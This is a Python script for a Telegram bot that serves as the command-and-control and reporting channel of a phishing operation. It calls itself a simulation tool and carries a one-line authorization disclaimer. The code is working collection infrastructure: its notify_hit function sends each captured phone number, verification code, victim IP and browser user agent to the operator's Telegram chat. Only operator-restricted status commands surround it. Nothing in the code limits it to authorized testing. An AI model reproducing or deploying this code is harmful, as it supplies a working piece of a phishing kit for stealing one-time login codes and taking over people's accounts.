#!/usr/bin/env python3
"""
Telegram C2 bot for phishing-simulation reporting.
Only run against targets you are authorized to test.
"""
import logging, os
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = os.environ["BOT_TOKEN"]     # from @BotFather
OPERATOR_ID = int(os.environ["OPERATOR_ID"])  # your chat id from @userinfobot

logging.basicConfig(level=logging.INFO)

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OPERATOR_ID:
        return
    await update.message.reply_text(
        "C2 online. Simulated credential hits will be posted here.\n"
        "Commands:\n/status - uptime\n/clear - acknowledge all pending hits"
    )

async def status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OPERATOR_ID:
        return
    await update.message.reply_text("Simulation running. Awaiting captive submissions.")

async def clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OPERATOR_ID:
        return
    await update.message.reply_text("Pending hits acknowledged.")

def notify_hit(phone: str, code: str, ip: str, ua: str):
    """Called by the web server to push a captured hit to the operator."""
    import requests
    text = (
        "🎣 *Simulated credential captured*\n"
        f"📱 Phone: `{phone}`\n"
        f"🔑 Code: `{code}`\n"
        f"🌐 IP: `{ip}`\n"
        f"🖥 UA: `{ua[:120]}`"
    )
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={"chat_id": OPERATOR_ID, "text": text, "parse_mode": "Markdown"},
        timeout=10,
    )

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("clear", clear))
    print("[*] C2 bot polling...")
    app.run_polling()
